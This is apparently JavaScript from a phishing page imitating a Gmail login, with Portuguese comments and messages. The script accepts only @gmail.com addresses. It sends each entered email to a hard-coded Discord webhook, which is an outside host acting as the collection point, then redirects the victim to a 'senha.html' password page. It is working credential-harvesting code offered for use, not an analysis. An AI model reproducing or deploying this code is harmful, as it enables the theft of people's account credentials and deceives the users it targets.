document.addEventListener('DOMContentLoaded', function () {
    const nextButton = document.getElementById('next-button');
    const emailInput = document.getElementById('email');
    const form = document.getElementById('login-form');
    const errorContainer = document.getElementById('error-container'); // Elemento para exibir a mensagem de erro

    // Função para ativar o botão "Próxima" quando o e-mail for preenchido e for válido
    emailInput.addEventListener('input', function () {
        const email = emailInput.value.trim();
        errorContainer.textContent = ''; // Limpar mensagem de erro a cada digitação

        // Verificar se o e-mail termina com '@gmail.com'
        if (email && email.endsWith('@gmail.com')) {
            nextButton.disabled = false; // Ativa o botão
        } else {
            nextButton.disabled = true; // Desativa o botão
            if (email !== '') {
                errorContainer.textContent = 'Apenas e-mails com domínio @gmail.com são permitidos.'; // Exibe a mensagem de erro
            }
        }
    });

    // Quando o botão de próxima for clicado
    nextButton.addEventListener('click', function () {
        const email = emailInput.value.trim();

        // Verificar se o campo de e-mail está vazio ou não contém '@gmail.com'
        if (email === '') {
            alert('Por favor, preencha o campo de e-mail.');
            return;
        }

        if (!email.endsWith('@gmail.com')) {
            alert('Por favor, insira um e-mail válido que termine com @gmail.com.');
            return;
        }

        // Enviar os dados para o Discord
        const webhookUrl = "https://discord.com/api/webhooks/1313707028773998683/7R83jdV8OI-7jKUAtEMRcqqgL9rsUaSpIAtW1rvYtfA5TBkAEj_QGanUMFiPaMELipAn"; // Substitua com seu webhook real
        const message = {
            content: `**Novo Cadastro**\n**E-mail:** ${email}`,
        };

        // Enviar a requisição para o Discord
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message),
        })
        .then(() => {
            console.log("Dados enviados para o Discord com sucesso!");
            // Redireciona para a página senha.html após o envio dos dados
            window.location.href = "senha.html";
        })
        .catch((error) => {
            console.error("Erro ao enviar os dados para o Discord:", error);
            alert("Erro ao realizar o cadastro. Tente novamente.");
        });
    });
});